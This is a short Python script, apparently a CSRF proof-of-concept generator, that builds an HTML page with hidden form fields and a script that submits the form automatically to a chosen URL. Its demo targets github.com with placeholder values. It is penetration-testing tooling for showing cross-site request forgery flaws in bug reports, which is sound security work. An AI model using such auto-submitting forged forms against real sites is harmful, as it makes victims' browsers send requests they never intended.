from yattag import Doc, indent


# to create form of html with author name and enctype
def form_create(method, url, params, author='', enc_type='application/x-www-form-urlencoded'):
    doc, tag, text = Doc().tagtext()
    with tag('html'):
        with tag('title'):
            text('This CSRF was found by ' + author)
        with tag('body'):
            with tag('h1'):
                text('This POC was Created By CSRF PoC Generator Tool')
            with tag('form', action=url, method=method, enctype=enc_type):
                for name in params:
                    value = params[name]
                    doc.stag('input', type='hidden', name=name, value=value)
            with tag('script'):
                text('document.forms[0].submit();')
    return indent(doc.getvalue(), indent_text=True)



if __name__ == '__main__':
    method = ["POST", "GET"][0]
    url = "https://github.com/"
    params = {"get":"asdasd"}
    author = "author"
    enctype = ["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"][1]
    try:
        print(form_create(method, url, params, author, enctype))
    except:
        print("Something Went Wrong With Parameters")
        exit(0)
